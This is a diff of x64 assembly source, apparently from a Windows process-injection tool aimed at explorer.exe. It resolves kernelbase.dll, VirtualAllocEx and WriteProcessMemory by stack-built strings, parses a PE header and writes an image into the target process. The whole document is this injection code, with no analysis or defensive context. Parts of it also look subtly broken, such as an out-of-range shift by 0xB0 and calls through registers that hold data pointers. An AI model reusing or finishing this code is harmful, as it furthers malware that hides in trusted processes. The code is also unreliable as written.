@@ -643,10 +643,10 @@ WinMain:
                 mov r10,rax
                 add rsp, 0x30
 
-                mov rdi, ".exe"
-                push rdi
-                mov rdi, "explorer"
-                push rdi
+                mov rax, ".exe"
+                push rax
+                mov rax, "explorer"
+                push rax
                 mov [rbp+0xF0], rsp
 
               
@@ -685,7 +685,7 @@ WinMain:
                         call LoadLibrary
 
                         loadKernelbase:
-                                ; Load msvcrt.dll
+                                ; Load kernelbase.dll
                                 mov rax, "se.dll"     
                                 push rax
                                 mov rax, "kernelba"
@@ -717,7 +717,7 @@ WinMain:
                                 mov r8, rbp
                                 sub rsp, 0x30
                                 call r12
-                                mov r13, rax
+                                mov rbp, rax
                                 add rsp, 0x30
 
                         VirtualAllocEx:
@@ -743,6 +743,66 @@ WinMain:
                                 mov r9d, 0x1000
                                 mov rbp, r13
                                 call r12
+                                mov r11,rax
+                                
+                                ;Calcula Delta
+                                mov r12,rdi
+                                mov r14,rdi
+                                add r14, 0x3c
+                                xor rdi,rdi
+                                mov rdi, [r14]
+                                shl rdi, 0xB0
+                                shr rdi, 0xB0
+                                mov r14, r12
+                                add r14, rdi
+                                mov r10d, [r14+0xB0]
+                                xor r15d,r15d
+                                add r10, rsi
+                             
+
+                        call Locate_kernel32
+                        call LoadLibrary
+
+                
+                        ;Load kernelbase.dll
+                        mov rax, "se.dll"     
+                        push rax
+                        mov rax, "kernelba"
+                        push rax
+                        mov rcx, rsp
+                        sub rsp, 0x30
+                        call rsi
+                        mov r15,rax
+                        add rsp, 0x30
+                        add rsp, 0x10
+
+
+                        WriteProcess:
+                                ;Lookup WriteProcessMemory
+                                mov rax, "ry"
+                                push rax
+                                mov rax, "cessMemo"
+                                push rax
+                                mov rax, "WritePro"
+                                push rax
+                                lea rdx, [rsp]
+                                mov rcx, r15
+                                sub rsp, 0x30
+                                call r14
+                                mov r12, rax
+                                add rsp, 0x30
+
+                                ;call WriteProcessMemory
+                                mov r9d, dword [r14+0x50]
+                                mov r8, rsi
+                                mov rdx, r11
+                                mov [rsp+0x20],r15
+                                mov rcx, rbp
+                                call r12
+                                mov rbp, rax
+                                add rsp, 0x30     
+                               
+                        
 
 
                         call Locate_kernel32
